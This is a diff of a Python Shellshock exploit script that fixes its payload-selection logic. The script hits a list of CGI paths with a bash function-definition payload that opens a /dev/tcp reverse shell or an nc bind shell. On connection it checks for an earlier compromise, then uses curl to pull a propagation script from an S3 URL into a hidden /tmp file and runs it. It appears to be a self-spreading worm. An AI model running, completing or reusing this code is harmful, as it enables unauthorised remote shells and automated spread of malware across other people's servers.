@@ -55,18 +55,13 @@ def exploit(lhost,lport,rhost,rport,payload,pages):
 
 def main(payload,lhost,lport,rhost):
 
-	if 'payload' == 'reverse':
+	if payload == 'reverse':
 		try:
-			lhost = args['lhost']
-			lport = int(args['lport'])
-			rhost = args['rhost']
 			payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 2>&1 &"
 		except:
 			usage()
-	elif 'payload' == 'bind':
+	elif payload == 'bind':
 		try:
-			rhost = args['rhost']
-			rport = args['rport']
 			payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
 		except:
 			usage()
@@ -106,7 +101,7 @@ def main(payload,lhost,lport,rhost):
 			"/phppath/cgi_wrapper",
 			"/phppath/php",]
 
-	if 'payload' == 'reverse':
+	if payload == 'reverse':
 		serversocket = socket(AF_INET, SOCK_STREAM)
 		buff = 1024
 		addr = (lhost, lport)
@@ -114,7 +109,7 @@ def main(payload,lhost,lport,rhost):
 		serversocket.listen(10)
 		print("[!] Started reverse shell handler")
 		_thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
-	if 'payload' == 'bind':
+	if payload == 'bind':
 		serversocket = socket(AF_INET, SOCK_STREAM)
 		addr = (rhost,int(rport))
 		_thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))
@@ -122,21 +117,24 @@ def main(payload,lhost,lport,rhost):
 	buff = 1024
 
 	while True:
-		if 'payload' == 'reverse':
+		if payload == 'reverse':
 			clientsocket, clientaddr = serversocket.accept()
 			print("[!] Successfully exploited")
 			print(f"[!] Incoming connection from {clientaddr[0]}")
 			# Hands off keyboard exploitation
 			stop = True
 			clientsocket.settimeout(100)
-			# TODO: Find general purpose method of testing w/o use of locate
-			"""
 			print("[-] Testing if target has already been exploited...")
-			clientsocket.sendall("ls /home/$(whoami)/Desktop/pwnd.jpeg".encode())
+			clientsocket.sendall("find / -name pwnd.jpeg".encode())
 			time.sleep(1)
-			data = clientsocket.recv(buff)
-			if
-			"""
+			try:
+				data = clientsocket.recv(buff)
+			except:
+				# No data == not found, keep moving
+				pass
+			else:
+				print("[!] Already pwned this one! Quitting...")
+				sys.exit(0)
 			print("[-] Obtaining propo...")
 			# These links may change as we update the files
 			clientsocket.sendall("curl https://genestealer-demo.s3.amazonaws.com/propo.sh --output /tmp/.propo --silent\n".encode())
@@ -154,9 +152,9 @@ def main(payload,lhost,lport,rhost):
 			else:
 				clientsocket.sendall("/tmp/.propo\n".encode())
 				clientsocket.close()
-				sys.exit(0)
+			sys.exit(0)
 		# Bind shell is less stable, so we won't implement for it
-		if 'payload' == 'bind':
+		if payload == 'bind':
 			try:
 				serversocket = socket(AF_INET, SOCK_STREAM)
 				time.sleep(1)
